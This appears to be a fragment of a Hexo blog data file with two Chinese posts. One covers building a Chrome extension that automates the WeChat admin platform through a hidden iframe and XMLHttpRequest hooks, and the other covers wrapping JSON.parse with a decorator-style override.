);</span><br></pre></td></tr></table></figure>\n<p>不能单独指定到哪个iframe，所以在代码执行前需要判断当前的<code>hostname</code>。</p>\n<p>我们如何知道页面进入了哪个地址下，然后需要做什么事呢，每个页面肯定有一个单独的url，在我们插入iframe时再绑定一个<code>onload</code>事件，每次在回调里注入我们的代码，代码立即会执行，再用<code>location.pathname</code>取得当前页面的pathname，以此名称作为函数名称来执行要做的事情（当然肯定要组织一个对象来存放映射的函数），比如通知我们的页面进入首页了，接下来需要输入密码登录。当然，可能并不是所有的网站每个页面都有个独立的pathname，比如微信后台某些页面带了查询参数来区分页面，那我们将参数取出再匹配一次，之前的pathname就不声明为函数，而声明为对象，将查询参数再匹配一次获得最终的结果。</p>\n<p>当然为了掌握别人的页面，我们肯定也要掌握每一个网络请求，chrome扩展本身提供了对网络请求的拦截，但不幸的是没有把响应消息体给我们，所以只能采取极端手段了，将代码真正的注入到dom里来改变原生<code>XmlHttpRequest</code>对象的行为，当然，这个权限也是要在<code>manifest.json</code>里面事先声明的。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XMLHttpRequest.prototype.open = ( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> original_function </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> method, url, async </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 保存请求相关参数</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.requestMethod = method;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.requestURL = url;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.addEventListener( <span class=\"string\">\"readystatechange\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.readyState === <span class=\"number\">4</span> ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; );</span><br><span class=\"line\">    <span class=\"keyword\">return</span> original_function.apply( <span class=\"keyword\">this</span>, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;( XMLHttpRequest.prototype.open ) );</span><br><span class=\"line\"></span><br><span class=\"line\">XMLHttpRequest.prototype.send = ( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> original_function </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 保存请求相关参数</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.requestData = data;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> original_function.apply( <span class=\"keyword\">this</span>, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;( XMLHttpRequest.prototype.send ) );</span><br></pre></td></tr></table></figure>\n<p>这样我们就能掌握所有的ajax请求了（当然<code>fetch</code>函数除外），对一些关注的网络请求，就能进行处理，并通知给扩展，扩展再通知给页面。最后便形成了目标页面到扩展，扩展再到页面的流程了。值得注意的是：</p>\n<ul>\n<li>iframe内发起的事件带出的数据，扩展内无法接收到也不知道是什么原因，所以最后我就放置了一个<code>textarea</code>标签来作为容器，通知扩展去取。</li>\n<li>自定义事件带入的数据需要{ detail: data } 这样的结构，因为在接收方需要以<code>event.detail</code>的方式去取。</li>\n</ul>\n<p>说了这么久感觉讲得不是很好，所以决定直接把代码放到github吧。<a href=\"https://github.com/Ryuurock/blog-code/tree/master/chrome-extention-demo\" target=\"_blank\" rel=\"noopener\">仓库地址</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>讲真，在这之前我甚至不知道chrome的插件是由<code>javascript</code>驱动的，最近因为为了优化产品的体验，开始从chrome插件来下手，因为chrome插件能强势侵入别家的网页，篡改任何你想篡改的东西，甚至可以将<code>http</code>的请求和响应数据进行修改。官方文档需要梯子， <a href=\"http://open.chrome.360.cn/\" target=\"_blank\" rel=\"noopener\">360翻译的文档</a>（不是一般的老，看网页布局就知道了）, <a href=\"https://chajian.baidu.com/developer/extensions/getstarted.html\" target=\"_blank\" rel=\"noopener\">百度翻译的文档</a>.废话不多说，先来看看入口吧<br>\nchrome插件最重要的是一个叫<code>manifest.json</code>的文件，文件描述了整个扩展的行为：</p>\n<ul>\n<li>整个扩展需要的权限（网络请求，标签页读取等）</li>\n<li>扩展的icon</li>\n<li>扩展的contentScript、background、popup资源路径</li>\n<li>…<br>\n<code>contentScript</code>是注入到页面的js代码，但是它执行于一个隔离的环境，变量函数等与现有网页不会互相污染。<br>\n<code>background</code>是一个背景</li>\n</ul>\n<blockquote>\n<p>背景页是一个运行在扩展进程中的HTML页面。它在你的扩展的整个生命周期都存在，同时，在同一时间只有一个实例处于活动状态。</p>\n</blockquote>\n<p>上面这句话是官方文档翻译后的描述，很符合“背景”这个名字，在后台，安安静静，相对一个整个浏览器的这个扩展，只有一个实例。<br>\n<code>popup</code>这个页面就是我们在点击扩展按钮时弹出的一个html页面，它可以与其他两个进行通信。</p>\n<p>其实我们要做的是，将微信等平台通过<code>iframe</code>的形式嵌入到我们页面，且不让用户看到，通过代码来操作iframe内的内容，使用户在使用我们产品的同时，能够保留保留微信后台的体验。</p>\n<p>经过我的整理，整个扩展与我们页面的交互流程大致应该是这样的</p>\n<ol>\n<li>当页面发起一个请求，判断插件是否安装成功</li>\n<li>若安装有扩展则再通知扩展需要的操作</li>\n<li>扩展插入iframe后注入contentScript</li>\n<li>contentScript执行再通知扩展，扩展再通知我们的页面获取结果</li>\n</ol>\n<p>当然这只是一个大致流程，扩展的<code>contentScript</code>与页面唯一的通信方法则是触发某个dom的原生事件或自定义事件，再传入所需的数据。<strong>发布/订阅模式</strong>看来真的是万能啊。</p>\n<p>当然，为了其他人开发的方便性和可维护性，我建立了一个单独的模块<code>chromeExtentionHandler</code>，由这个模块统一管理与扩展的交互（这也是发布/订阅模式的弊端，过多的订阅发布，容易造成困扰，降低代码可读性）</p>\n<p>监听来自扩展的事件，只需要一处就够了，扩展通过带过来的数据来告知模块需要发布或处理怎样的数据，所以定义的页面端的模块传入数据是这样的</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"event\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"platform\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"data\"</span>: &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>所以我在事件监听处是这么写的</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.body.addEventListener( <span class=\"string\">'extensionBrowerEvent'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> &#123; detail &#125; </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> jsonDetail = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    jsonDetail = <span class=\"keyword\">typeof</span> detail === <span class=\"string\">'object'</span> ? ( detail || &#123;&#125; ) : <span class=\"built_in\">JSON</span>.parse( detail );</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> ( error ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> &#123; event, data, platform &#125; = jsonDetail;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> eventHandlers = platformHandler[ platform ];</span><br><span class=\"line\">  <span class=\"keyword\">let</span> namespaceEvent = <span class=\"string\">`<span class=\"subst\">$&#123;platform&#125;</span>.<span class=\"subst\">$&#123;event&#125;</span>`</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( eventHandlers ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 根据平台来获取相关的事件处理</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> handlerItem = eventHandlers[ namespaceEvent ];</span><br><span class=\"line\">    handlerItem ? handlerItem( data ) : events.emit( namespaceEvent, data );</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    events.emit( namespaceEvent, data );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;, <span class=\"literal\">false</span> );</span><br></pre></td></tr></table></figure>\n<p><code>event</code>就是用来描述此次扩展消息的名称的，因为可能会存在多个平台操作的问题，所以<code>platform</code>用来标记平台名称，比如<code>wechat</code>，data当然是此次消息需要的数据。<code>namespaceEvent</code>是用来描述命名空间了，为了对不同平台相同的事件进行区分。<br>\n这些事件中，有些需要模块来处理，有些需要模块调用者来处理，所以在上面的<code>if</code>逻辑里，就是用扩展通知的数据去匹配定义在对象里的函数进行处理，处理后再由函数决定是否发布此事件，若没有匹配到，则直接在此发布事件，说明此事件应由模块调用者自己处理。举个例子，扩展发出的数据是这样的</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"event\"</span>: <span class=\"string\">\"scanCode\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"platform\"</span>: <span class=\"string\">\"wechat\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"data\"</span>: <span class=\"literal\">null</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>于是我们在平台为<code>wechat</code>的模块里定义了它的处理函数</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">'wechat.scanCode'</span>( data ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\">    events.emit( <span class=\"string\">'wechat.scanCode'</span>, data );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过上面的事件函数就能匹配到这里的函数再执行，那么如果有一个行文是一连串的话要怎么解决呢，比如发送一篇文章的流程是，<strong>登录》扫码》进入主页》跳转到编辑器页面》插入发送内容》…</strong>。难道调用者都要如此去每个事件监听再处理吗。为此，我们需要提供一个行为，叫“发送文章”，像大多数轮子一样，我们只需要提供一个函数就够了，如果是异步的，则返回一个<code>Promise</code>实例。于是wechat平台下还应该有这么一个对象</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  sendArticle: ( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 用户信息缓存</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> userInfoTemp = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> articles, appID </span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\">(<span class=\"params\"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// 发起一个封装好的通知插件初始化iframe的请求</span></span><br><span class=\"line\">        initWechatFrame();</span><br><span class=\"line\">        <span class=\"comment\">// 进入微信公众平台首页</span></span><br><span class=\"line\">        event.one( wechatConst._enteredIndex, <span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">// 发起获取公众号账户和密码的请求</span></span><br><span class=\"line\">          <span class=\"keyword\">let</span> &#123; username, password &#125; = userInfoTemp ? <span class=\"built_in\">Promise</span>.resolve( userInfoTemp ) : <span class=\"keyword\">await</span> $.ajax</span><br><span class=\"line\"></span><br><span class=\"line\">          sendMessageToPulgin( &#123;</span><br><span class=\"line\">            platform: <span class=\"string\">'wechat'</span>,</span><br><span class=\"line\">            <span class=\"comment\">// 这里后面会讲为什么event也有命名空间</span></span><br><span class=\"line\">            event: <span class=\"string\">'page.login'</span>,</span><br><span class=\"line\">            data: &#123;</span><br><span class=\"line\">              username,</span><br><span class=\"line\">              password</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\">        </span><br><span class=\"line\">        event.one( wechatConst._enteredHome, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"comment\">// 登录成功进入首页</span></span><br><span class=\"line\">          sendMessageToPulgin( &#123;</span><br><span class=\"line\">            platform: <span class=\"string\">'wechat'</span>,</span><br><span class=\"line\">            event: <span class=\"string\">'page.goEditor'</span></span><br><span class=\"line\">          &#125; );</span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">        event.one( wechatConst._enteredEditor, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"comment\">// 登录成功进入编辑器</span></span><br><span class=\"line\">          </span><br><span class=\"line\">          <span class=\"comment\">// some code</span></span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">// 发送成功</span></span><br><span class=\"line\">        event.one( wechatConst.sendSuccess, resolve );</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      &#125; ).catch( <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>( err );</span><br><span class=\"line\">      &#125; );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;() )</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这里使用闭包函数是为了缓存用户信息，方便在多次操作时提高效率<br>\n为什么没有使用链式调用进行订阅，因为在这里还少一点代码没有码上，<code>one</code>方法返回一个当前订阅事件的id，为了在某个时刻对它们的订阅统一解除。虽然这里只订阅一次，但是还是有在某些情况出现重复订阅的情况，比如操作中途取消掉再操作。<br>\n至此，类似的一个行为的订阅集合，我们就能统一放到一个方法里面再导出，为模块调用者提供一套独立的业务能力，发送、预览等。</p>\n<p>模块端就马马虎虎介绍到这里，很多细节应该是遗漏了，想到要如果要逐行的描述出来，怕是您也没什么兴趣读下去了。</p>\n<p>接下来是扩展端，扩展端其实我已经想到了很远，甚至想到了兼容无数平台的场景，但是。。。。</p>\n<p>扩展端我们还是尊崇一进一出原则，一个出口，一个入口。扩展端接收的消息类型更复杂，从通知扩展插入iframe，再到注入脚本到iframe内，iframe的事件通知给我们的页面都是个繁杂的过程。因为iframe的事件首先要通知给插入到iframe的脚本，脚本再通知给最外层的，也就是注入到我们页面的<code>contentscript</code>，再由它来通知给页面dom触发事件。</p>\n<h5>还是先从入口说起吧。</h5>\n<p>思路是从一个<code>contentScript.js</code>文件作为入口，发送的消息还是按照平台来区分，但是<code>event</code>会多一个命名空间，用来区分事件是给通知<code>contentScript</code>的还是通知插入到iframe的<code>contentScript</code>的，这里我们为了区分每个平台就分别对应一个contentScript，查了文档，在使用下面这段代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chrome.tabs.executeScript( tabId, &#123;</span><br><span class=\"line\">  file: fileName,</span><br><span class=\"line\">  allFrames: <span class=\"literal\">true</span></span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>不能单独指定到哪个iframe，所以在代码执行前需要判断当前的<code>hostname</code>。</p>\n<p>我们如何知道页面进入了哪个地址下，然后需要做什么事呢，每个页面肯定有一个单独的url，在我们插入iframe时再绑定一个<code>onload</code>事件，每次在回调里注入我们的代码，代码立即会执行，再用<code>location.pathname</code>取得当前页面的pathname，以此名称作为函数名称来执行要做的事情（当然肯定要组织一个对象来存放映射的函数），比如通知我们的页面进入首页了，接下来需要输入密码登录。当然，可能并不是所有的网站每个页面都有个独立的pathname，比如微信后台某些页面带了查询参数来区分页面，那我们将参数取出再匹配一次，之前的pathname就不声明为函数，而声明为对象，将查询参数再匹配一次获得最终的结果。</p>\n<p>当然为了掌握别人的页面，我们肯定也要掌握每一个网络请求，chrome扩展本身提供了对网络请求的拦截，但不幸的是没有把响应消息体给我们，所以只能采取极端手段了，将代码真正的注入到dom里来改变原生<code>XmlHttpRequest</code>对象的行为，当然，这个权限也是要在<code>manifest.json</code>里面事先声明的。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XMLHttpRequest.prototype.open = ( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> original_function </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> method, url, async </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 保存请求相关参数</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.requestMethod = method;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.requestURL = url;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.addEventListener( <span class=\"string\">\"readystatechange\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.readyState === <span class=\"number\">4</span> ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// do something</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; );</span><br><span class=\"line\">    <span class=\"keyword\">return</span> original_function.apply( <span class=\"keyword\">this</span>, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;( XMLHttpRequest.prototype.open ) );</span><br><span class=\"line\"></span><br><span class=\"line\">XMLHttpRequest.prototype.send = ( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> original_function </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 保存请求相关参数</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.requestData = data;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> original_function.apply( <span class=\"keyword\">this</span>, <span class=\"built_in\">arguments</span> );</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;( XMLHttpRequest.prototype.send ) );</span><br></pre></td></tr></table></figure>\n<p>这样我们就能掌握所有的ajax请求了（当然<code>fetch</code>函数除外），对一些关注的网络请求，就能进行处理，并通知给扩展，扩展再通知给页面。最后便形成了目标页面到扩展，扩展再到页面的流程了。值得注意的是：</p>\n<ul>\n<li>iframe内发起的事件带出的数据，扩展内无法接收到也不知道是什么原因，所以最后我就放置了一个<code>textarea</code>标签来作为容器，通知扩展去取。</li>\n<li>自定义事件带入的数据需要{ detail: data } 这样的结构，因为在接收方需要以<code>event.detail</code>的方式去取。</li>\n</ul>\n<p>说了这么久感觉讲得不是很好，所以决定直接把代码放到github吧。<a href=\"https://github.com/Ryuurock/blog-code/tree/master/chrome-extention-demo\" target=\"_blank\" rel=\"noopener\">仓库地址</a></p>\n"},{"title":"JavaScript使用装饰器模式让代码伸展自如","catalog":true,"date":"2017-10-15T14:44:51.000Z","subtitle":null,"header-img":"post/IMG_2992.JPG?imageMogr2/interlace/1/quality/50","_content":"前段时间一直在追**装饰器模式**，但是java的我都懂，为了扩展一个类或者其中的方法，非常的麻烦（相较于js），因为要新建一个类去装饰它，我更想知道js如何去实现的，看了网上的一些例子，发现并不是很实用，都是为了实现而实现，都没有从实际开发出发，有模仿java实现的嫌疑，模式模式，并不是固定的写法，它只是为了实现某种需求的一种思路，具体实现当然要从语言本身特性出发，废话不多说，还是从遇到的问题出发\n\n> 最近更新了Chrome，我发现项目里很多的接口返回的数据Preview一栏里居然乱码了，也没有format，第一反应就是浏览器更新了什么东西，因为代码不会无缘无故图片全部变成这样了，因为没有format，所以第一时间就能想到响应头本来就是错的！\n\n查看响应头后，数据类型果然全部都是text/html，拜托后端童鞋修改后果然显示正常也不乱码了（其实数据本身没有问题，就是显示乱码了），可是 很多页面出现了 JSON数据格式化错误的error信息，原因是我们之前很多的jQuery请求都没有设置相应数据类型，所以jq没有帮我们format，所以我们在`success`回调里主动`JSON.parse`了数据，现在改变了统一的相应类型，所以JSON.parse就报错了，有的页面没有报错是因为之前吃了同时的亏，有的接口json有的html格式，导致我直接\n```js\nsuccess( res ) {\n let data = typeof res === 'string' ? JSON.parse( res ) : res;\n}\n```\n\n这样就一劳永逸了，可是没有这么些的怎么办，几十上百个请求我都要去修改吗，那我还不如叫后端童鞋改回去呢，这不找事儿吗。\n\n解决问题，就要从问题发生的地方着手，问题出在JSON.parse（有的地方用的是`$.parseJSON`，查看源码后发现其实使用的还是JSON.parse，就不用管它了）身上，我们就从它入手好了，我们需要扩展一下JSON.parse的行为，**装饰器模式**就登场了\n```js\n// 备份原先的方法\nlet _parseJson = JSON.parse;\n\n// \nJSON.parse = function( text, ...args ) {\n  return typeof text === 'object' ?\n    text :\n    _parseJson.call( this, text, ...args );\n};\n```\n\n这样一来短短几行代码就能解决99%的问题了，当然这个函数前提是被全局引用。但是还有一种情况我也无能为力了，必须全局查找修改。那就是使用`eval`函数格式化的代码，什么？你说重写Object的`toString`方法？算了，这操作太骚了，我不敢，毕竟项目里使用了大量的第三方插件。","source":"_posts/Decorator.md","raw":"---\ntitle: JavaScript使用装饰器模式让代码伸展自如\ncatalog: true\ndate: 2017-10-15 22:44:51\nsubtitle:\nheader-img: post/IMG_2992.JPG?imageMogr2/interlace/1/quality/50\ntags:\n- 装饰器\n- Decorator\n---\n前段时间一直在追**装饰器模式**，但是java的我都懂，为了扩展一个类或者其中的方法，非常的麻烦（相较于js），因为要新建一个类去装饰它，我更想知道js如何去实现的，看了网上的一些例子，发现并不是很实用，都是为了实现而实现，都没有从实际开发出发，有模仿java实现的嫌疑，模式模式，并不是固定的写法，它只是为了实现某种需求的一种思路，具体实现当然要从语言本身特性出发，废话不多说，还是从遇到的问题出发\n\n> 最近更新了Chrome，我发现项目里很多的接口返回的数据Preview一栏里居然乱码了，也没有format，第一反应就是浏览器更新了什么东西，因为代码不会无缘无故图片全部变成这样了，因为没有format，所以第一时间就能想到响应头本来就是错的！\n\n查看响应头后，数据类型果然全部都是text/html，拜托后端童鞋修改后果然显示正常也不乱码了（其实数据本身没有问题，就是显示乱码了），可是 很多页面出现了 JSON数据格式化错误的error信息，原因是我们之前很多的jQuery请求都没有设置相应数据类型，所以jq没有帮我们format，所以我们在`success`回调里主动`JSON.parse`了数据，现在改变了统一的相应类型，所以JSON.parse就报错了，有的页面没有报错是因为之前吃了同时的亏，有的接口json有的html格式，导致我直接\n```js\nsuccess( res ) {\n let data = typeof res === 'string' ? JSON.parse( res ) : res;\n}\n```\n\n这样就一劳永逸了，可是没有这么些的怎么办，几十上百个请求我都要去修改吗，那我还不如叫后端童鞋改回去呢，这不找事儿吗。\n\n解决问题，就要从问题发生的地方着手，问题出在JSON.parse（有的地方用的是`$.parseJSON`，查看源码后发现其实使用的还是JSON.parse，就不用管它了）身上，我们就从它入手好了，我们需要扩展一下JSON.parse的行为，**装饰器模式**就登场了\n```js\n// 备份原先的方法\nlet _parseJson = JSON.parse;\n\n// \nJSON.parse = function( text, ...args ) {\n  return typeof text === 'object' ?\n    text :\n    _parseJson.call( this, text, ...args 